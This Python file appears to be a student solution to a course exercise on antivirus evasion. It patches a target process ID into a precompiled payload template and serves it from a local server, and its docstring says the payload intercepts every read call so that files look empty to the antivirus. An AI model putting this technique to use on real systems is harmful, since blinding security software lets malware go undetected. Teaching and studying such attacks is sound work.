import evasion
import struct


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to intercept all calls to read.

        Reminder: We want to intercept all calls to read (for all files)
        and replace them with calls that read a length of 0 bytes (to make
        the files appear empty).

        Notes:
        1. You can assume we already compiled q4.c into q4.template.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q4.template'
        template_file = open(PATH_TO_TEMPLATE, 'rb')
        template_data = template_file.read()
        template_file.close()

        # Find pid
        pid_address = template_data.find(b"\x78\x56\x34\x12")

        # Create a list of opcodes in decimal from patches
        pid_bytes = list(struct.pack('<I', pid))

        # Patching
        template_bytes_list = list(template_data)
        template_bytes_list[pid_address:pid_address+len(pid_bytes)] = pid_bytes
        return bytes(template_bytes_list)

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
